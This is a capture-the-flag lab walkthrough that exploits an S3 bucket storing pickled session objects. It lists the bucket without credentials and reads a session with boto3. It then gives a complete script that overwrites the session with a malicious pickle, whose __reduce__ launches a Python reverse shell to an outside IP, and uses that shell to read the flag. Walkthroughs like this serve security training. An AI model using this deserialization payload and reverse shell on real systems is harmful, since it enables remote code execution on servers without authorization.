# S3 Python Object Store

Open the lab link and a VNC session will be opened in a new tab with a browser window showing the appication 

![image](https://user-images.githubusercontent.com/46797181/228726011-7eef8812-b4d2-46de-935d-0708fce89a37.png)

Checking the page source, it shows that components are loaded from the s3 bucket 
![image](https://user-images.githubusercontent.com/46797181/228726536-460404e7-c81a-4dd0-a6af-1566d598ced5.png)

Execute the command `aws --endpoint http://s3.pentesteracademylab.appspot.com --no-sign-request s3 ls s3://assets`

#### Note: This challenge is loaded in PT Academy VNC machine, it works only there, using local machine, HTTP 404 will appear 

There is a `sessions` folder, check with `aws --endpoint http://s3.pentesteracademylab.appspot.com --no-sign-request s3 ls s3://assets/sessions/`

The `sessions` directory has a value, log in the web application with the credentials `guest:guest` as stated in the exercise instructions, then repeat the above command and notice that another session object has been created.

![image](https://user-images.githubusercontent.com/46797181/228727892-28109b46-30da-4462-a938-2e5f79a5521e.png)

Interact with the S3 server using boto3 python library and check the content of the recently created object in `sessions` directory.

```

python
import boto3
from botocore import UNSIGNED
from botocore.config import Config
s3=boto3.client('s3',
endpoint_url='http://s3.pentesteracademylab.appspot.com',config=Config(signature_version=UN
SIGNED))
object =
s3.get_object(Bucket='assets',Key='sessions/43085237187070924862845585858148322582')
data=object['Body'].read()
data
import pickle
pickle.loads(data)
```
![image](https://user-images.githubusercontent.com/46797181/228729251-315b2b6e-e439-4819-a53b-863d683a9c00.png)

Create a python script to generate the required pickle payload and overwrite the recently created object in the `sessions` directory.

```
import pickle
import subprocess
import os
import boto3
from botocore import UNSIGNED
from botocore.config import Config
class Shell(object):
 def __reduce__(self):
  return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.162.63.2\",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
s3=boto3.client('s3',endpoint_url='http://s3.pentesteracademylab.appspot.com',config=Config(signature_version=UNSIGNED))
pickledData=pickle.dumps(Shell())
s3.put_object(Bucket='assets',Key='sessions/43085237187070924862845585858148322582',Body=pickledData)


```
Execute the script, refresh the web page and the shell is obtained, then get the flag in `/root/flag`

![image](https://user-images.githubusercontent.com/46797181/228736926-fa905399-15fc-4d7e-a4b1-e6d566899372.png)


#### Note: When refreshing the web page, the session is killed and login screen appears again. If want to repeat the step, log in again with guest:guest, obtain the new session value in `sessions` and replace the value in the python script and execute again the script along with refreshing the page to obtan again the shell

!! EXERCISE COOMPLETED 







